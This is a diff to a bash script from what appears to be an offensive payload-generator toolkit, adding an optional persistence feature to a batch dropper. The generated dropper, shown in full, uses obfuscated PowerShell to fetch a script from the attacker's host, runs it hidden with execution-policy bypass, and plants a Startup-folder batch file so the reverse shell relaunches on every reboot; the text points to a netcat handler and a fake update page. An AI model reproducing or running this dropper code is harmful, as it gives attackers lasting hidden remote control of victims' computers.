@@ -12362,10 +12362,21 @@ echo "---"
 ## BUILD DROPPER
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-echo "@echo off" > $IPATH/output/$Drop.$ext.bat
-echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
-echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
-echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" FALSE "No (default)" TRUE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
+
+if [ "$persistence" = "No (default)" ]; then
+   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+else
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
+   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo @echo off&&PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" ^> \"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
+fi
 
 
 ## Convert attacker ip address to hex
@@ -12448,6 +12459,11 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
+
+## Remark related to 'persistence' function..
+if [ "$persistence" = "Add persistence)" ]; then
+   zenity --title="☠ Reverse Powershell Shell (hex obfustaion) ☠" --text "REMARK:\nTo delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1\n2 - %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.bat" --info --width 350 > /dev/null 2>&1
+fi
 sh_menu
 }
 
